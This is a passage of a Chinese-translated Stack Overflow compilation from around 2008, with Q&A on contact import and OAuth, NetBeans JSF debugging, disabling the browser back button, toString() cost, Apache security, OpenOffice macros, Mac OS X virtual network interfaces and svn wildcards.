这就是[OAuth](http://oauth.net/)的设计目的。 [谷歌已经开始采用它](http://groups.google.com/group/oauth/msg/0cf50121f946a889)。它没有与更典型的抓取相同的信任问题。

不幸的是，就目前而言，人们倾向于只询问您的密码，以您的身份登录并抓取信息，这远不安全，因为它使网站可以完全访问您的帐户。这不是你应该复制的东西，尽可能使用 OAuth 或等效的东西。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-09-17T22:04:08.253

有可用的 API：

雅虎 --> [http://developer.yahoo.com/addressbook/](http://developer.yahoo.com/addressbook/)

谷歌 --> [http://code.google.com/apis/contacts/](http://code.google.com/apis/contacts/)

AOL（还没有）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T20:40:43.960

我假设他们通过 POP3、公共 API 登录您的电子邮件帐户，或者他们知道网络邮件系统的 html 格式并阅读 DOM。然后他们会找到您接收和发送电子邮件的任何人，并通过它自己的用户数据库查找匹配项。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-09-17T20:52:53.277

是的，我同意。使用您的电子邮件凭据信任站点是不安全的。尤其是在 gmail 存档器（[http://it.slashdot.org/article.pl?sid=08/03/11/1723206&from=rss](http://it.slashdot.org/article.pl?sid=08/03/11/1723206&from=rss)）发现了什么之后

但仅从程序化 POV 来看，我想知道他们是如何做到这一点的。也许Gmail hotmail和所有其他人确实有用户可以使用的API......我猜需要更多地研究它。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2011-03-28T20:04:37.333

[联系人列表](http://code.google.com/p/contact-list/)Java库易于使用，可与 Gmail、Yahoo!、Yahoo、Hotmail 和 MSN 配合使用。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2008-09-17T20:47:49.607

对于 gmail：

[http://sourceforge.net/projects/gmail-api](http://sourceforge.net/projects/gmail-api)

[http://johnvey.com/features/gmailapi/](http://johnvey.com/features/gmailapi/)

# jsf - 使用 Netbeans 指定调试源

> ID：87411
> 
> 赞同：5
> 
> 时间：2008-09-17T20:38:54.747
> 
> 标签：jsf, netbeans

使用 Netbeans 6.1 中的调试器，我想进入 JSF 库的一个方法（特别是 StateManager 类的 saveSerializedView 方法），但我不知道如何通过 IDE 指定 JSF 库的源代码的位置. 我什至无法确定 Netbeans 将哪个 jar 文件或哪些文件用于 JSF。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-09-18T17:38:34.907

这个答案适用于大约 2008 年 9 月的 Netbeans 6.1：

听起来好像您需要探索“库”对话框。从菜单栏中选择“工具”，从菜单中选择“库”。如果您选择左侧的“JSF”，您将看到 jar 文件、源（目前在我的 Netbeans 6.1 中没有）和 javadoc（在我的 Netbeans 中显示 javaee5-doc-api.zip）的关联。

您需要做的是在“Sources”标签下添加一个新的 zip 或 jar 源文件。

一个完全填充的库的例子是“Swing Layout Extensions”，它有一个 jar 文件、源代码和 javadoc。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-09-18T04:12:35.577

我认为你的罐子不包括来源，因为你不能“进入”。在这种情况下，我要做的是找到适当的源（在这种情况下，只是 StateManager.java，如果它可用，或者包含源的 jar），注意它是我正在使用的版本。在我的项目树中，我为该特定类创建包层次结构，并将该源代码放在那里。即使该类存在于 jar 中，我也可以使用此源设置断点等。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-07-21T15:49:08.180

Netbeans7 和 Mojarra 2.0.3 的示例
创建一个新库（Tools->Libraries），例如 Mojarra-2.0.3。
在类路径选项卡中添加 2 个 mojarra 罐子：

*   jsf-api.jar
*   jsf-impl.jar

在源选项卡中，添加两个路径：

*   ..\mojarra-2.0.3-FCS-source\jsf-api\src\main\java\

*   ..\mojarra-2.0.3-FCS-source\jsf-ri\src\main\java\ 将新建的库添加到项目中

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-19T10:55:47.877

下载 jsf 源代码并指向工作文件夹进行源代码查找。它将深入研究代码

# browser - 禁用浏览器上的后退按钮

> ID：87422
> 
> 赞同：31
> 
> 时间：2008-09-17T20:39:23.450
> 
> 标签：browser, back-button

我正在编写一个应用程序，如果用户回击，它可能会重新发送相同的信息并打乱数据的流动和完整性。如何为使用和不使用 javascript 的用户禁用它？

* * *

## 回答 #1

> 赞同：76
> 
> 时间：2008-09-17T20:41:01.073

这是不可能的，很遗憾。但是，请考虑您的应用程序导航模型。你在使用 Post/Redirect/Get PRG 模型吗？[http://en.wikipedia.org/wiki/Post/Redirect/Get](http://en.wikipedia.org/wiki/Post/Redirect/Get) ?

此模型比 Postback 模型对返回按钮更友好。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2008-09-17T20:44:51.830

你不应该。

您可以将一些脚本附加到页面的 onbeforeunload 事件并与用户确认他们想要做什么；您可以更进一步*尝试*[禁用它，](http://www.irt.org/script/311.htm)但当然这只适用于打开了 javascript 的用户。相反，请考虑重写应用程序，这样您就不会在每个提交页面上提交事务，而只是在流程结束时提交。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2008-09-17T20:47:34.337

我强烈敦促您竭尽全力防止破坏后退按钮，这是疏远您的用户的可靠方法，甚至在[Jacob Neilsen 的 1999 年十大网页设计错误中排名](http://www.useit.com/alertbox/990530.html)第一。

也许您可以考虑提出以下问题：“如何避免破坏 <在此处插入您的场景> 的后退按钮？”

如果 Scott 的答案接近分数，请考虑将流程更改为 PRG 模型。如果是其他问题，请提供更多详细信息，看看我们如何提供帮助。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2011-05-04T09:16:58.003

我想出了一个小技巧，可以使用 JavaScript 禁用后退按钮。我在 chrome 10、firefox 3.6 和 IE9 上检查了它：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" >
<title>Untitled Page</title>
<script type = "text/javascript" >
function changeHashOnLoad() {
     window.location.href += "#";
     setTimeout("changeHashAgain()", "50"); 
}

function changeHashAgain() {
  window.location.href += "1";
}

var storedHash = window.location.hash;
window.setInterval(function () {
    if (window.location.hash != storedHash) {
         window.location.hash = storedHash;
    }
}, 50);

</script>
</head>
<body onload="changeHashOnLoad(); ">
Try to hit back!
</body>
</html> 
```

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2008-09-17T21:02:14.080

最好的选择是不要依赖回发来控制流量，但是如果你坚持使用它（现在）

你可以使用这样的东西：

```
 Response.Cache.SetCacheability(HttpCacheability.NoCache);
  Response.Cache.SetExpires(Now.AddSeconds(-1));
  Response.Cache.SetNoStore();
  Response.AppendHeader("Pragma", "no-cache"); 
```

很快您会发现它不适用于所有浏览器，但是您可以在代码中引入检查，例如：

```
 if (Page.IsPostBack)
 {
        if (pageIsExpired()){
           Response.Redirect("/Some_error_page.htm");
        }
        else {
           var now = Now;
           Session("TimeStamp") = now.ToString();
           ViewState("TimeStamp") = now.ToString();
        }

  private boolean pageIsExpired()
  {
     if (Session("TimeStamp") == null || ViewState("TimeStamp") == null)
        return false;

     if (Session("TimeStamp") == ViewState("TimeStamp"))
        return true;

        return false;
  } 
```

这将在某种程度上解决问题，代码未检查 - 仅用于示例目的..

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2013-06-18T21:15:27.557

可以在所有主要浏览器中禁用后退按钮。它只是使用哈希值来完全禁用后退按钮。只需将这 5 行代码放在您的页面中

```
 <script>
window.location.hash="no-back-button";
window.location.hash="Again-no-back-button";//for google chrome
window.onhashchange=function(){window.location.hash="no-back-button";}
</script> 
```

[**详细说明**](http://programmerslate.blogspot.in/2013/06/disable-back-button-of-your-browser.html)

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-09-17T20:45:25.697

这是以前的帖子： [防止使用后退按钮（在 IE 中）](https://stackoverflow.com/questions/54539/prevent-use-of-the-back-button-in-ie)

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2008-09-17T21:50:54.293

无论您想出什么来禁用后退按钮，都可能不会在未来的浏览器中停止后退按钮。

如果它处于开发周期的后期，我建议您尝试上面的一些建议，但是当您有时间时，您应该构建您的流程，以便后退按钮不会干扰您网站的逻辑，它只是将用户带回到上一页，如他们希望这样做。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2011-12-09T21:34:53.170

确实，应该添加适当的验证以确保重复数据不会搞砸。但是，就我而言，我无法完全控制数据，因为我在表单之后使用了一些第三方 API。所以我用了这个

```
history.go(+1); 
```

这会将用户转发到“收据”，如果他们尝试返回“付款”页面（例如，只需支付），则该“收据”应该出现在“付款”页面之后。不过要谨慎使用

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-09-17T20:45:00.567

您可以将每个表单上的数据发布到 _NEW 窗口。这将禁用每个窗口上的后退按钮，但如果没有 javascript，可能很难强制关闭旧窗口。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2011-10-26T18:13:34.723

我能够通过使用：

```
 Response.Cache.SetExpires(DateTime.MinValue);
 Response.Cache.SetNoStore(); 
```

当我使用 Response.Cache.SetCacheability(HttpCacheability.NoCache); 它阻止我下载办公文件。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2013-04-18T13:30:15.470

找到下面的链接

在 asp.net 中使用 JavaScript 禁用浏览器后退按钮功能 | ASP.Net 禁用浏览器后退按钮（使用 javascript）

[http://www.aspdotnet-suresh.com/2011/11/disable-browser-back-button.html](http://www.aspdotnet-suresh.com/2011/11/disable-browser-back-button.html)

# c# - 通常假设 toString() 成本低是否安全？

> ID：87425
> 
> 赞同：15
> 
> 时间：2008-09-17T20:39:29.113
> 
> 标签：c#, java

您是否通常认为任何给定对象上的 toString() 成本较低（即用于日志记录）？我愿意。这个假设有效吗？如果它的成本很高，通常应该改变吗？以高成本制作 toString() 方法的正当理由是什么？我唯一担心 toString 成本的时候是当我知道它在具有许多成员的某种集合上时。来自：http: [//jamesjava.blogspot.com/2007/08/tostring-cost.html](http://jamesjava.blogspot.com/2007/08/tostring-cost.html)

更新：另一种说法是：您通常在调用任何给定类之前查看调用 toString 的成本吗？

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2008-09-17T20:43:38.743

不，这不对。因为任何人都可以重载 ToString()，所以他们可以为所欲为。一个合理的假设是 ToString() 应该具有低成本，但是如果 ToString() 访问执行“延迟加载”数据的属性，您甚至可能会在 ToString() 中访问数据库。

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2008-09-17T20:48:17.250

Java 标准库似乎是为了保持 toString 调用的成本非常低而编写的。例如，Java 数组和集合具有不迭代其内容的 toString 方法；要获得这些对象的良好字符串表示，您必须使用包中的任何一个`Arrays.toString`或`Collections.toString`从`java.util`包中。

类似地，即使具有昂贵的 equals 方法的对象也有便宜的 toString 调用。例如，`java.net.URL`该类有一个 equals 方法，它利用 Internet 连接来确定两个 URL 是否真正相等，但它仍然有一个简单且恒定时间的 toString 方法。

所以是的，廉价的 toString 调用是常态，除非你使用一些违反约定的奇怪的第三方包，否则你不应该担心这些会花费很长时间。

当然，在您发现自己的程序运行时间过长之前，您不应该真正担心性能问题，即便如此，您也应该使用分析器来找出耗时过长的原因，而不是担心未来的此类事情的时间。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2008-09-17T20:47:32.573

找出答案的最佳方法是分析您的代码。但是，与其担心特定函数的开销很大，不如（通常）更好地担心应用程序的正确性，然后对其进行性能分析（但要注意实际使用和测试设置可能会大不相同） ）。事实证明，程序员通常会错误地猜测他们的应用程序中真正慢的地方，他们经常花费大量时间优化不需要优化的东西（消除只消耗应用程序 0.01% 时间的三重嵌套循环可能是浪费）。

幸运的是，有很多[用于 Java 的开源分析器](http://java-source.net/open-source/profilers)。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2008-09-17T20:43:17.480

> 您通常认为任何给定对象上的 toString() 成本低吗？我愿意。

为什么要这么做？*如果*您遇到性能问题，请分析您的代码；它会为您节省大量时间来解决不正确的假设。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-09-17T22:16:24.153

您的问题的标题使用了“安全”和“一般”这两个相互矛盾的词。因此，即使在评论中你似乎在强调一般情况，答案可能是“是的，这通常不是问题”，但很多人认为“安全”，因此回答“不，因为有一个任意表现不佳的风险”或“不，因为如果你想在表现问题上‘安全’，你*必须*分析。”

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-09-17T20:41:49.200

由于我通常只对自己编写的方法和类调用 toString() 并覆盖基本方法，所以我通常提前知道成本是多少。我唯一使用 toString() 的时间是错误处理和/或在速度不重要时进行调试。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-09-17T20:51:18.553

我务实的回答是：是的，你总是认为 toString() 调用很便宜，除非你大量使用它们。一方面， toString() 方法不太可能很昂贵，另一方面，如果不是，您也不太可能遇到麻烦。我一般不担心这样的问题，因为它们太多了，如果你这样做了，你将不会编写任何代码;)。

如果你确实遇到了性能问题，一切都是开放的，包括 toString() 的性能，你应该按照 Shog9 的建议，简单地分析代码。[Java Puzzlers](http://www.javapuzzlers.com)表明，甚至 Sun 在他们的 JDK 中也编写了一些非常讨厌的构造函数和 toString() 方法。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-09-17T22:24:12.810

我认为这个问题有一个缺陷。我什至不会假设 toString() 会打印出有用的数据。所以，如果你从这个假设开始，你知道你必须在调用它之前检查它，并且可以根据具体情况评估它的“成本”。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-09-17T20:47:08.050

天真的 toString() 链接的最大成本可能是附加所有这些字符串。如果要生成大字符串，则应使用支持有效追加的底层表示。如果您知道追加是有效的，那么 toString() 的成本可能相对较低。

例如，在 Java 中，StringBuilder 将预先分配一些空间，以便一定数量的字符串附加需要线性时间。当您用完空间时，它将重新分配。

一般来说，如果您想附加事物序列并且出于某种原因不想做类似的事情，您可以使用[差异列表](http://en.wikipedia.org/wiki/Difference_lists)。这些通过将序列追加转换为函数组合来支持线性时间追加。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-09-17T20:47:11.823

toString() 用于将对象表示为字符串。因此，如果您需要运行缓慢的代码来创建对象的表示，则需要**非常小心**并且有充分的理由这样做。调试将是我能想到的唯一可以接受运行缓慢的 toString 的地方。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-09-17T21:02:20.430

我的想法是：

在标准库对象上是

对非标准对象不适用，除非您面前有源代码并且可以检查它。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-09-17T21:25:25.260

我将始终覆盖 toString 以放入我认为调试问题所需的任何内容。通常由开发人员通过调用 toString 方法本身或让另一个类为您调用它（println、日志记录等）来使用它。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2008-09-17T22:17:34.557

这个问题有一个简单的答案，我在一次关于反思的讨论中第一次听到：“如果你不得不问，你买不起。”

基本上，如果您在程序的日常操作中需要大对象的 ToString()，那么您的程序就是疯了。即使你需要 ToString() 一个整数来处理任何时间紧迫的问题，你的程序也很疯狂，因为它显然使用了一个整数可以做的字符串。

日志消息的 ToString() 自动没问题，因为日志记录已经很昂贵了。如果您的程序太慢，请调低日志级别！只要您可以选择不生成调试消息，实际生成调试消息的速度有多慢并不重要。（注意：您的日志基础设施应该调用 ToString() 本身，并且仅在应该打印日志消息时。不要在*进入*日志基础设施的途中手动 ToString() ，否则您甚至会付出代价如果日志级别低并且您根本不会打印它！有关此的更多解释，请参见[http://www.colijn.ca/~caffeine/?m=200708#16 。）](http://www.colijn.ca/~caffeine/?m=200708#16)

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2008-09-17T22:20:08.060

既然你在你的问题中加上“一般”，我会说是的。对于 -most- 对象，不会有代价高昂的 ToString 重载。肯定有，但一般不会有。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2008-09-17T23:16:38.550

一般来说，当我在简单对象（例如整数或非常简单的结构）上使用 toString() 时，我认为它的成本很低。然而，当应用于复杂对象时， toString() 有点废话。有两个原因。首先，复杂对象往往包含其他对象，因此对 toString() 的一次调用可以级联到对其他对象的多次 toString() 调用，以及连接所有这些结果的开销。其次，没有将复杂对象转换为字符串的“标准”。一个 toString() 调用可能会产生一行逗号分隔的值；另一种更详细的形式。只有自己查了才知道。

所以我的规则是简单对象上的 toString() 通常是安全的，但复杂对象上是可疑的，直到检查。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2008-09-18T17:46:37.413

我会避免在基本类型以外的对象上使用 toString() 。toString() 可能不会显示任何有用的信息。它可以遍历所有成员变量并将它们打印出来。它可能会加载尚未加载的内容。根据您打算如何处理该字符串，您应该考虑不构建它。

使用 toString() 通常有几个原因： 日志记录/调试可能是随机对象最常见的；显示对于某些对象（例如数字）很常见。对于日志记录，我会做类似的事情

```
if(logger.isDebugEnabled()) {
    logger.debug("The zig didn't take off.  Response: {0}", response.getAsXML().toString());
} 
```

这有两件事：1\. 防止构造字符串和 2\. 如果消息不会被记录，则防止不必要的字符串添加。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2008-12-18T21:53:13.793

一般来说，我不会检查每个实现。但是，如果我看到对 Apache commons 的依赖，警钟就会响起，我会更仔细地查看实现，以确保它们没有使用[ToStringBuilder](http://commons.apache.org/lang/api/org/apache/commons/lang/builder/ToStringBuilder.html)或其他暴行。

# security - Redhat + Apache 的主要漏洞有哪些？

> ID：87431
> 
> 赞同：0
> 
> 时间：2008-09-17T20:40:02.980
> 
> 标签：security

我正在寻找新的商业网站的主机。除其他外，我想知道各种操作系统 - 网络服务器组合在漏洞方面有什么。Redhat + Apache 的漏洞有哪些？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-17T20:41:14.053

见：[http ://httpd.apache.org/security/vulnerabilities_20.html](http://httpd.apache.org/security/vulnerabilities_20.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T20:49:05.330

在我的经验中，糟糕的系统管理员是最大的。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-10-03T08:47:17.890

任何 Web 应用程序服务器的最大风险是 Web 应用程序本身的漏洞。Linux Apache MySQL 和 PHP (LAMP) 是一个非常安全的平台。RedHat 的 Fedora 内核非常安全，因为它使用 SELinux，这是 Windows 不存在的东西。但是，SQL 注入和 XSS 等漏洞仍然可能导致您的服务器被黑客入侵。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T20:47:56.567

这是一个很难回答的问题，开发生命周期是如此活跃，你要求的东西可能已经解决（如果它被报告以便我们知道它，它修复的可能性真的很高）

你需要的是他们的 0-day hack，而问这个列表真的不会让你得到那些。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T20:49:45.360

任何系统的强大都取决于其最薄弱的环节。始终不是操作系统或服务器软件，而是您开发或安装的最终应用程序。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-09-19T20:48:20.470

正如[这里](https://stackoverflow.com/questions/87393/what-are-the-major-vulnerabilities-of-windows-2003-iis)所建议的，我可以查看[CERT 数据库](http://www.kb.cert.org/vuls/)。

# .net - 如何使用 .NET 从 OpenOffice.org Writer 文档中以编程方式提取宏？

> ID：87437
> 
> 赞同：2
> 
> 时间：2008-09-17T20:40:52.730
> 
> 标签：.net, automation, openoffice.org, libreoffice

如何使用 .NET API 从 OpenOffice.org Writer 文档中提取宏代码？

我得到了这个问题的[“Office 2007”版本](https://stackoverflow.com/questions/49724/programmatically-extract-macro-vba-code-from-word-2007-docs)的答案，但我们正在评估 OpenOffice 作为替代方案——如果有人对此有任何经验，任何提示或资源将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-12T16:46:06.230

这是一个相当古老的问题，但现在有几个答案可能有用：

1.  [如何在 .NET 中创建 OpenOffice 文档](https://stackoverflow.com/questions/2273787/how-to-create-an-openoffice-document-in-net?rq=1)
2.  [如何以编程方式在 OpenOffice.org 中保存文档？](https://stackoverflow.com/questions/2022846/how-do-i-programmatically-save-a-document-in-openoffice-org?rq=1)

# macos - Mac OS X 中的虚拟网络接口

> ID：87442
> 
> 赞同：55
> 
> 时间：2008-09-17T20:41:12.260
> 
> 标签：macos, networking

我知道您可以在 Windows 中创建一个虚拟网络接口（请参阅[此处](http://support.microsoft.com/kb/236869)），在 Linux 中使用 ip-aliases 也很容易，但是 Mac OS X 是否存在类似的东西？我一直在寻找环回适配器、虚拟接口，但找不到好的解决方案。

您可以在网络面板中基于现有接口创建新接口，但它不会充当真正的全功能接口（如果原始接口处于非活动状态，则派生的接口也将处于非活动状态）。

在完全断开连接的情况下工作时需要这种情况。即便如此，在 VMWare 安装中运行服务器时，拥有网络功能也是有意义的。这些虚拟机可以通过它们的 IP 地址访问，但不能通过它们的 DNS 名称访问，即使我在其中一个虚拟机中运行 DNS 服务器也是如此。通过配置一个接口来使用虚拟 DNS 服务器，我想我可以测试一些 DNS 场景。不幸的是，如果没有一个接口处于非活动状态，则没有接口解析 DNS 名称......

* * *

## 回答 #1

> 赞同：63
> 
> 时间：2009-03-09T01:03:29.047

环回适配器始终处于启动状态。

**ifconfig lo0 alias 172.16.123.1**会将别名 IP 172.16.123.1 添加到回送适配器

**ifconfig lo0 -alias 172.16.123.1**将删除它

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2011-06-16T16:27:41.803

特别回复：

> 您可以在网络面板中基于现有接口创建新接口，但它不会充当真正的全功能接口（如果原始接口处于非活动状态，则派生的接口也将处于非活动状态）。

这可以使用 psv141 建议的 Tun/Tap 设备来实现，并`/Library/Preferences/SystemConfiguration/preferences.plist`根据 tun 或 tap 接口操作文件以添加 NetworkService。Mac OS X 不允许创建基于虚拟网络接口的 NetworkService，但可以直接操作`preferences.plist`文件以手动添加 NetworkService。基本上你会`preferences.plist`在 Xcode 中打开文件（或直接编辑 XML，但 Xcode 可能更简单），并从现有的以太网接口复制配置。创建新 NetworkService 的位置在“NetworkServices”下，如果您的 Mac 有以太网设备，NetworkService 配置文件也将在此属性条目下。以太网条目几乎可以逐字复制，您实际要更改的唯一字段是：

*   UUID
*   用户定义名称
*   IPv4 配置并将接口设置为您的 tun 或 tap 设备（即 tun0 或 tap0）。
*   如果需要，DNS 服务器。

然后，您还将操作您希望此 NetworkService 用于的特定位置（请记住，Mac OS X 可以根据您的“位置”配置所有网络接口）。默认位置 UUID 可以在 PropertyList 的根目录中作为键“CurrentSet”获取。在确定您想要的位置（或集合）之后，展开 Set 属性，并在 Global/IPv4/ServiceOrder 下添加具有新 NetworkService 的 UUID 的条目。同样在 Set 属性下，您需要展开 Service 属性并在此处添加 UUID 作为字典，其中包含一个带有键 __LINK__ 和值作为 UUID 的字符串条目（以其他接口为例）。

修改`preferences.plist`文件后，只需重新启动，NetworkService 将在 SystemPreferences->Network 下可用。请注意，我们模拟了以太网设备，因此 Mac OS X 网络层会注意到“电缆已拔出”，并且不会让您通过 GUI 激活接口。然而，由于底层设备是一个 tun/tap 设备并且它有一个 IP 地址，接口将变为活动状态，并且将在 BSD 级别添加正确的路由。

**作为参考，这用于执行特殊的路由魔术。**

如果您走到这一步并且遇到问题，您必须通过打开 /dev/ 下的设备之一来创建 tun/tap 设备。您可以使用任何程序来执行此操作，但我自己是老式 C 的粉丝：

```
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
int main()
{
   int fd = open("/dev/tun0", O_RDONLY);
   if (fd < 0)
   {
      printf("Failed to open tun/tap device. Are you root? Are the drivers installed?\n");
      return -1;
   }
   while (1)
   {
      sleep(100000);
   }
   return 0;
} 
```

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2015-07-07T04:15:02.107

关于`@bmasterswizzle`'s [BRILLIANT answer](https://stackoverflow.com/a/6375307/547214) - 更具体地说 -`@DanRamos`关于如何强制新接口的链接状态“启动”的问题。我使用这个脚本，我不记得它的起源，但它工作得非常好（与[@bmasterswizzles “蒙娜丽莎”的答案](https://stackoverflow.com/a/6375307/547214)）...

```
#!/bin/zsh

[[ "$UID" -ne "0" ]] && echo "You must be root. Goodbye..." && exit 1
echo "starting"
exec 4<>/dev/tap0
ifconfig tap0 10.10.10.1 10.10.10.255
ifconfig tap0 up
ping -c1 10.10.10.1
echo "ending"
export PS1="tap interface>"
dd of=/dev/null <&4 & # continuously reads from buffer and dumps to null 
```

我不太确定我是否理解最后对提示的更改，或者......

> `dd of=/dev/null <&4 & # continuously reads from buffer and dumps to null`

但是无所谓。有用。链接灯：*绿色*✅。 **喜欢它**。

![在此处输入图像描述](https://i.stack.imgur.com/LAJIK.png)

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2015-04-24T22:49:42.370

其他一些人似乎暗示了这一点，但以下演示了使用 ifconfig在 OS X 10.9.5上的虚拟接口（使用[minidns ）上创建 vlan 和测试 DNS：](https://code.google.com/p/minidns/)

```
$ sw_vers -productVersion
10.9.5
$ sudo ifconfig vlan169 create && echo vlan169 created
vlan169 created
$ sudo ifconfig vlan169 inet 169.254.169.254 netmask 255.255.255.255 && echo vlan169 configured
vlan169 configured
$ sudo ./minidns.py 169.254.169.254 &
[1] 35125
$ miniDNS :: * 60 IN A 169.254.169.254

$ dig @169.254.169.254 +short test.host
Request: test.host. -> 169.254.169.254
Request: test.host. -> 169.254.169.254
169.254.169.254
$ sudo kill 35125
$ 
[1]+  Exit 143                sudo ./minidns.py 169.254.169.254
$ sudo ifconfig vlan169 destroy && echo vlan169 destroyed
vlan169 destroyed 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2009-11-19T15:29:45.543

可以使用 TUN/TAP 设备。 [http://tuntaposx.sourceforge.net/](http://tuntaposx.sourceforge.net/)

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2018-06-08T07:21:22.670

如果您在开发环境中并且想要访问已经在 localhost/主机上运行的某些服务。在 docker for mac 中你有另一个选项。在 docker 容器中使用 docker.for.mac.localhost 而不是 localhost。应使用 docker.for.mac.host.internal 而不是 Docker Community Edition 17.12.0-ce-mac46 2018-01-09 中的 docker.for.mac.localhost。这允许您从 docker 容器中连接到在您的 Mac 上运行的服务。请参阅下面的链接

[了解 docker.for.mac.localhost 的行为](https://forums.docker.com/t/understanding-the-docker-for-mac-localhost-behavior/41921)

[发行说明](https://docs.docker.com/docker-for-mac/release-notes/#docker-community-edition-17120-ce-mac46-2018-01-09)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-09-17T20:58:51.860

你是什​​么意思

> “但它不会充当真正的全功能接口（如果原始接口处于非活动状态，则派生接口也处于非活动状态”

?

我可以创建一个新界面，基于现有的界面，然后禁用现有的界面，新界面仍然有效。然而，创建第二个接口并不会创建一个真正的接口（当您使用 ifconfig 检查时），它只会为已经存在的接口分配第二个 IP（但是，这个可以是 DHCP，而第一个是硬编码的）。

那么我是否理解正确，您想创建一个界面，而不是绑定到任何真实界面？那么如何使用这个接口呢？例如，如果您断开所有 WLAN 并拔出所有网络电缆，如果您向其发送流量，该接口会将流量发送到哪里？也许你的问题有点不清楚，如果改写它可能会有很大帮助，所以一旦你有了这个“虚拟界面”，你就很清楚你实际上想用它做什么。

正如您在问题中提到的“别名 IP”，这意味着别名接口。但是别名接口总是绑定到真实接口。不同的是，在 Linux 中这样的接口实际上**是**一个接口（例如 eth0 的别名接口可能是 eth1），而在 Mac 上，没有创建*真正的*接口，而是创建了一个虚拟接口，可以独立配置和使用，但它物理上仍然是相同的接口，因此不会生成新的命名接口（您只有两个接口，实际上都是 en0，但都可以独立启用/禁用和配置）。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2010-09-24T01:32:24.700

看看这个教程，它适用于 FreeBSD，但也适用于 OS X。[http://people.freebsd.org/~arved/vlan/vlan_en.html](http://people.freebsd.org/~arved/vlan/vlan_en.html)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2010-06-08T17:49:31.687

我已经求助于运行 PFSense，一个基于 BSD 的路由器/防火墙来实现这个目标......。

为什么？因为 OS X Server 在没有静态 IP 的情况下变得如此怪异……</p>

所以在与它搏斗了 DAYS 来制作 NAT、DHCP 和防火墙之后......</p>

我正在尝试这是相似之处……</p>

会让你知道进展如何...

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2011-01-05T14:25:35.240

转到网络首选项。

在网络适配器列表的底部，单击**+**图标

选择您想要 arp 的现有接口（例如以太网 1），并为新端口（例如以太网 1.1）提供您想要的服务名称，然后按创建。

现在您在 gui 中拥有了新的虚拟接口，并且可以以正常方式管理 IP 地址等。

ifconfig -a 将确认您在接口上有多个 IP，并且在您重新启动时这些 IP 仍然存在。

它是一个 Mac。不要打它，做简单的方法。

* * *

## 回答 #11

> 赞同：-1
> 
> 时间：2008-09-17T21:01:43.880

ifconfig interfacename create 将创建一个虚拟接口，

* * *

## 回答 #12

> 赞同：-1
> 
> 时间：2013-10-22T14:46:49.703

这是一个很好的指南：[https ://web.archive.org/web/20160301104014/http://gerrydevstory.com/2012/08/20/how-to-create-virtual-network-interface-on-mac-os -X/](https://web.archive.org/web/20160301104014/http://gerrydevstory.com/2012/08/20/how-to-create-virtual-network-interface-on-mac-os-x/)

基本上，您在系统偏好设置的网络窗格中选择一个网络适配器，然后单击齿轮以“复制服务”。复制服务后，您可以在其中一个私有地址范围内手动分配 IP。然后ping它以确保；）

# svn - 您可以在 subversion mv 命令中使用通配符或正则表达式指定文件名吗？

> ID：87458
> 
> 赞同：5
> 
> 时间：2008-09-17T20:43:04.360
> 
> 标签：svn

我想这样做，以便我可以说类似的话`svn mv *.php php-folder/`，但它似乎不起作用。甚至可能吗？[在svn book](http://svnbook.red-bean.com/en/1.0/re18.html)的相关页面上没有提到它。

的示例输出`svn mv *.php php-folder/`：
`svn: Client error in parsing arguments`

能够移动整个文件系统将是一个加分项，因此，如果给出的任何答案都可以尝试包含该功能，那就太酷了。

提前致谢！

* * *

## 回答 #1

> 赞同：13
> 
